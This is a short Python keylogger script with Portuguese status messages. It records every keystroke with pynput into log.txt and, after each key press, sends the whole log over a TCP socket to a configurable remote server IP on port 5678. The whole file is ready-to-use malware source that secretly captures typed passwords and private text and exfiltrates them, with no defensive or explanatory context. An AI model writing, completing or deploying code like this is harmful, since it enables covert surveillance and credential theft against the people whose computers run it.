from pynput.keyboard import Listener
import socket
import os

def on_press(key):
    file_path = os.path.join(os.getcwd(), 'log.txt')
    with open('log.txt', 'a') as f:
        f.write(str(key) + '\n')
    send_file('log.txt')

def send_file(file_path):
    SERVER_IP = 'ENTER SERVER IP '
    PORT = 5678
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((SERVER_IP, PORT))
            print(f'Conectado a {SERVER_IP}')
            with open(file_path, 'rb') as file:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    s.sendall(data)
            print('File send')
        except Exception as e:
            print(f'Erro ao enviar arquivo: {e}')

with Listener(on_press=on_press) as listener:
    listener.join()
